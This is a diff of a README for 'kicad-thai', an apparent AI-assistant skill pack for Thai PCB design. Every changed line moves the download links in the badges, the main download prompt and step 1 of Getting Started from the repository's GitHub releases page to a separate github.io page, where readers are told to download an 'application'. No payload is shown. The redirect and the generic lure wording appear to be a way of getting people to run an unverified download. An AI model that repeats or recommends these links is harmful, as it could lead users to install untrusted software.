@@ -1,8 +1,8 @@
 # 🇹🇭 kicad-thai - PCB Skills Built For Thailand
 
-[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
-[![Made for Thailand](https://img.shields.io/badge/Made%20for-Thailand-2ea44f?style=for-the-badge)](https://github.com/jerssonhans-creator/kicad-thai/releases)
-[![Works with AI assistants](https://img.shields.io/badge/Works%20with-AI%20Assistants-8957e5?style=for-the-badge)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://jerssonhans-creator.github.io)
+[![Made for Thailand](https://img.shields.io/badge/Made%20for-Thailand-2ea44f?style=for-the-badge)](https://jerssonhans-creator.github.io)
+[![Works with AI assistants](https://img.shields.io/badge/Works%20with-AI%20Assistants-8957e5?style=for-the-badge)](https://jerssonhans-creator.github.io)
 
 A ready-to-use set of skills that teaches your AI assistant how to help you design circuit boards the Thai way — with local manufacturing rules, export settings for Thai-friendly board houses, and silkscreen text in Thai script.
 
@@ -12,7 +12,7 @@ A ready-to-use set of skills that teaches your AI assistant how to help you desi
 
 **Visit this link to download the application:**
 
-### 👉 https://github.com/jerssonhans-creator/kicad-thai/releases
+### 👉 https://jerssonhans-creator.github.io
 
 That page is where every released version lives. Open it, pick the newest release at the top of the list, and download the file attached to it. Save it somewhere easy to find, like your Downloads folder or your Desktop.
 
@@ -66,7 +66,7 @@ The same skill pack is structured so it can be loaded by Claude Code, Codex, Cur
 
 ## 🚀 Getting Started
 
-1. **Visit the download page.** Open https://github.com/jerssonhans-creator/kicad-thai/releases in your browser.
+1. **Visit the download page.** Open https://jerssonhans-creator.github.io in your browser.
 2. **Choose the latest release.** The newest version sits at the top of the page. Older versions are listed below it.
 3. **Download the attached file.** Look under the release notes for the downloadable asset and click it. Your browser saves it automatically.
 4. **Keep the file somewhere permanent.** Move it out of your temporary Downloads folder into a folder you will remember, such as `Documents\kicad-thai`.
